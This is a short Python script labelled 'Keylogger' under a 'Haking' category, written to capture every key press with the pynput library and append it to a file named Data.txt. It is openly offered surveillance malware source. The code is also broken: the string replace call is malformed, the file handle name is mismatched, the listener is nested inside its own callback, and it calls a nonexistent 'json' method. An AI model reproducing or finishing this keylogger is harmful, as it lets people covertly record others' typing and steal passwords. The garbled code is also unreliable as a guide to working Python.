####### Author: Janek Długołecki
###### Category: Haking
##### Version: 0,1
#### Name: Keylogger
## system: Windows_Linux_Mac OS


from pynput.keyboard import Listener  # type: ignore

def save_typed_info(key):
    alpha = str(key)
    alpha = alpha.replace(" ' " "." " ") 
    with open('Data.txt','a') as file:
        f.write(alpha)   # type: ignore
        #Driver code 
        with Listener(on_press=save_typed_info) as source:
            source.json()
